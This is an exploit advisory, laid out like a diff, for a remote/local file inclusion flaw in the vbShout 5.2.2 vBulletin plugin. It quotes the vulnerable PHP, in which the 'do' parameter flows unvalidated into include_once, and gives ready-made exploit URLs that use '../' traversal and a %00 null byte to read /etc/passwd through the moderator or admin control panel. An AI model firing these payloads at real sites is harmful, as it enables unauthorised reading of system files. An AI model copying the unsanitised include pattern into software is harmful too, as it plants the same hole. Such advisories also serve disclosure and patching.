@@ -1,0 +1,68 @@
+			
+#################################################
++
++  Title:       vbShout 5.2.2 Remote/Local File Inlcusion (Mod/Admin)
++  Author:      fred777 - [fred777.5x.to]
++  Link:        http://www.dragonbyte-tech.com/vbecommerce.php?do=purchase&act=product&id=2
++  Vuln:        vbshout.php?do=[path/file][NULL-Byte]
++  Greetzz to:  SceneCoderz
++  Contact:     nebelfrost77@googlemail.com
++
+#################################################
+ 
+--[ Vuln Code ] --
+ 
+modcp/vbshout.php:
+admincp/vbshout.php:
+
+
+else if (!empty($_GET['do']))
+{
+	// We had a GET request instead
+
+$action = $_GET['do'];
+
+if (!empty($_POST['do']))
+{
+	// $_POST requests take priority
+	
+$action = $_POST['do'];
+}
+
+
+if (!file_exists(DIR . '/dbtech/vbshout/includes/actions/admin/' . $action . '.php'))
+{
+	if (!file_exists(DIR . '/dbtech/vbshout_pro/includes/actions/admin/' . $action . '.php'))
+	{
+		// Throw error from invalid action
+		print_cp_message($vbphrase['dbtech_vbshout_invalid_action']);
+	}
+	else
+	{
+		// Include the selected file
+		include_once(DIR . '/dbtech/vbshout_pro/includes/actions/admin/' . $action . '.php');	
+	}
+}
+else
+{
+	// Include the selected file
+	include_once(DIR . '/dbtech/vbshout/includes/actions/admin/' . $action . '.php');	
+}
+
+=>
+
+../../../../../../etc/passwd%00
+ 
+################################################
+ 
+--[ Exploitable ]--
+ 
+http://server/vbshout.php?do=[PATH/FILE][NULL-Byte]
+ 
+http://server/vbshout.php?do=../../../../../../../../etc/passwd%00
+ 
+You must be mod oder admin:
+modcp/vbshout.php
+admincp/vbshout.php
+ 
+################################################
